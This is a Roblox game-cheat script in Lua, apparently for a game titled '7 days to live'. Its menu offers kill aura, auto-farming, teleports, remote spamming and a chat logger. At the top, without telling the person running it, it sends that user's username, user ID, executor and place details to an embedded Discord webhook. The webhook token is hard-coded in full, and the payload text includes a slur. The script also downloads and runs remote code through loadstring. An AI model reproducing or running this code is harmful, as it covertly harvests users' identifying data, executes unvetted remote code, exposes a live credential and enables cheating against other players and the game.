local b = {"CahyaXyZp", "bludisdancer"}
local lp = game.Players.LocalPlayer
for _, n in ipairs(b) do
    if lp.Name == n then
        lp:Kick("you are blacklisted because you join discord for the script and left!")
        break
    end
end

local hs = game:GetService("HttpService")
local wh = "https://discord.com/api/webhooks/1363978720410468515/pzO3alicvMtGr5Of8f1d5gMgbGAeqNLLurXQ_yN8Oir1wgXFAPPLUGXpf5berHh4tphp"
local ex = "Unknown"
if syn then
    ex = "Synapse X"
elseif secure_load then
    ex = "Sentinel"
elseif pebc_execute then
    ex = "KRNL"
elseif identifyexecutor then
    ex = identifyexecutor()
elseif hookfunction and checkcaller and setreadonly then
    ex = "Delta"
end

local ms = game:GetService("MarketplaceService")
local pn = "Unknown"
pcall(function()
    pn = ms:GetProductInfo(game.PlaceId).Name
end)

local d = {
    content = string.format("7 gays\nRoblox Username: %s\nDisplay Name: %s\nUser ID: %s\nExecutor: %s\nPlace ID: %s\nPlace Name: %s",
    lp.Name, lp.DisplayName, lp.UserId, ex, game.PlaceId, pn)
}
local j = hs:JSONEncode(d)
local r = (syn and syn.request) or request or (http and http.request)
if r then
    r({Url = wh, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = j})
end

local L = loadstring(game:HttpGet("https://raw.githubusercontent.com/0-BaconScripter-0/Mobile-Support-For-UI-Library/refs/heads/main/Unnamed.lua"))()
local W = L:CreateWindow("7 days to live")
local A = W:AddFolder("script")

A:AddToggle({
    text = "aura kill",
    state = false,
    callback = function(v)
        _G.ShootAura = v
        if v then
            local range = 50
            task.spawn(function()
                while _G.ShootAura do
                    for _, scp in ipairs(workspace.scps:GetChildren()) do
                        local head = scp:FindFirstChild("Head")
                        if head and (head.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude < range then
                            game.ReplicatedStorage.remotes.shoot:FireServer(head.CFrame)
                        end
                    end
                    task.wait(0.2)
                end
            end)
        end
    end
})

A:AddToggle({
    text = "instant chop tree(near tree)",
    state = false,
    callback = function(v)
        _G.G = v
        if v then
            task.spawn(function()
                while _G.G do
                    game:GetService("ReplicatedStorage").remotes.swing_axe:FireServer()
                    task.wait(0.01)
                end
            end)
        end
    end
})

A:AddToggle({
    text = "auto farm scrap",
    state = false,
    callback = function(v)
        _G.APS = v
        if v then
            task.spawn(function()
                local p = game.Players.LocalPlayer
                local c = p.Character or p.CharacterAdded:Wait()
                local h = c:WaitForChild("HumanoidRootPart")
                while _G.APS do
                    for _, s in pairs(workspace:WaitForChild("scraps"):GetChildren()) do
                        if not _G.APS then break end
                        local f = s:FindFirstChildWhichIsA("BasePart")
                        if f then
                            h.CFrame = f.CFrame + Vector3.new(0, 2, 0)
                            task.wait(0.1)
                            local cp = nil
                            local closestDist = 15
                            for _, o in pairs(workspace:GetDescendants()) do
                                if o:IsA("ProximityPrompt") and o.Parent:IsA("BasePart") then
                                    local dist = (h.Position - o.Parent.Position).Magnitude
                                    if dist < closestDist then
                                        cp = o
                                        closestDist = dist
                                    end
                                end
                            end
                            if cp then
                                fireproximityprompt(cp)
                            end
                        end
                    end
                    task.wait()
                end
            end)
        end
    end
})

A:AddToggle({
    text = "active proximity prompts",
    state = false,
    callback = function(v)
        _G.APP = v
        if v then
            task.spawn(function()
                local p = game.Players.LocalPlayer
                local c = p.Character or p.CharacterAdded:Wait()
                local h = c:WaitForChild("HumanoidRootPart")
                local r = 15
                while _G.APP do
                    local cp = nil
                    local d = r
                    for _, o in pairs(workspace:GetDescendants()) do
                        if o:IsA("ProximityPrompt") and o.Parent:IsA("BasePart") then
                            local dist = (h.Position - o.Parent.Position).Magnitude
                            if dist < d then
                                cp = o
                                d = dist
                            end
                        end
                    end
                    if cp then
                        fireproximityprompt(cp)
                    end
                    task.wait()
                end
            end)
        end
    end
})

A:AddButton({
    text = "teleport to spawn",
    callback = function()
        local p = game.Players.LocalPlayer
        local c = p.Character or p.CharacterAdded:Wait()
        local h = c:WaitForChild("HumanoidRootPart")
        h.CFrame = CFrame.new(57, 42, 416)
    end
})

A:AddButton({
    text = "instant max hunger(hold any food)",
    callback = function()
        for i = 1, 20 do
game:GetService("Players").LocalPlayer.Character.Cabbage.eat:FireServer()
end
    end
})

A:AddButton({
    text = "unlock chat",
    callback = function()
        local a = game:GetService("Players")
local b = a.LocalPlayer

local c = Instance.new("ScreenGui", b:WaitForChild("PlayerGui"))
c.Name = "ChatGUI"
c.ResetOnSpawn = false

local d = Instance.new("Frame")
d.Size = UDim2.new(0, 320, 0, 260)
d.Position = UDim2.new(0, 20, 0.5, -130)
d.BackgroundTransparency = 0.7
d.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
d.BorderSizePixel = 0
d.Parent = c
d.Active = true
d.Draggable = true

Instance.new("UICorner", d).CornerRadius = UDim.new(0, 8)

local e = Instance.new("Frame", d)
e.Size = UDim2.new(1, 0, 0, 30)
e.BackgroundTransparency = 0.7
e.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
e.BorderSizePixel = 0

Instance.new("UICorner", e).CornerRadius = UDim.new(0, 8)

local f = Instance.new("TextLabel", e)
f.Size = UDim2.new(1, -60, 1, 0)
f.Position = UDim2.new(0, 0, 0, 0)
f.BackgroundTransparency = 1
f.Text = "idk chat logger or sum(@opalbetus)"
f.Font = Enum.Font.Gotham
f.TextSize = 14
f.TextColor3 = Color3.new(1, 1, 1)
f.TextXAlignment = Enum.TextXAlignment.Center

local g = Instance.new("TextButton", e)
g.Text = "-"
g.Size = UDim2.new(0, 30, 0, 25)
g.Position = UDim2.new(1, -60, 0.5, -12)
g.BackgroundTransparency = 0.7
g.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
g.TextColor3 = Color3.new(1, 1, 1)
g.Font = Enum.Font.Gotham
g.TextSize = 14
Instance.new("UICorner", g)

local h = Instance.new("TextButton", e)
h.Text = "X"
h.Size = UDim2.new(0, 30, 0, 25)
h.Position = UDim2.new(1, -30, 0.5, -12)
h.BackgroundTransparency = 0.7
h.BackgroundColor3 = Color3.fromRGB(80, 30, 30)
h.TextColor3 = Color3.new(1, 1, 1)
h.Font = Enum.Font.Gotham
h.TextSize = 14
Instance.new("UICorner", h)

local i = Instance.new("ScrollingFrame", d)
i.Name = "ChatFrame"
i.Position = UDim2.new(0, 5, 0, 35)
i.Size = UDim2.new(1, -10, 1, -40)
i.BackgroundTransparency = 1
i.BorderSizePixel = 0
i.CanvasSize = UDim2.new(0, 0, 0, 1000)
i.ScrollBarThickness = 4

local j = Instance.new("UIListLayout", i)
j.Padding = UDim.new(0, 4)
j.SortOrder = Enum.SortOrder.LayoutOrder

local function k(p, m)
    local l = Instance.new("TextLabel", i)
    l.Size = UDim2.new(1, -10, 0, 20)
    l.BackgroundTransparency = 1
    l.TextColor3 = Color3.fromRGB(220, 220, 220)
    l.TextXAlignment = Enum.TextXAlignment.Left
    l.Font = Enum.Font.Gotham
    l.TextSize = 14
    l.Text = p.DisplayName..": "..m
end

for _, p in ipairs(a:GetPlayers()) do
    p.Chatted:Connect(function(m)
        k(p, m)
    end)
end

a.PlayerAdded:Connect(function(p)
    p.Chatted:Connect(function(m)
        k(p, m)
    end)
end)

local n = false
g.MouseButton1Click:Connect(function()
    n = not n
    if n then
        d.Size = UDim2.new(0, 320, 0, 30)
        i.Visible = false
    else
        d.Size = UDim2.new(0, 320, 0, 260)
        i.Visible = true
    end
end)

h.MouseButton1Click:Connect(function()
    c:Destroy()
end)
    end
})

A:AddLabel({
    text = "Made by Pall(@opalbetus)"
})

L:Init()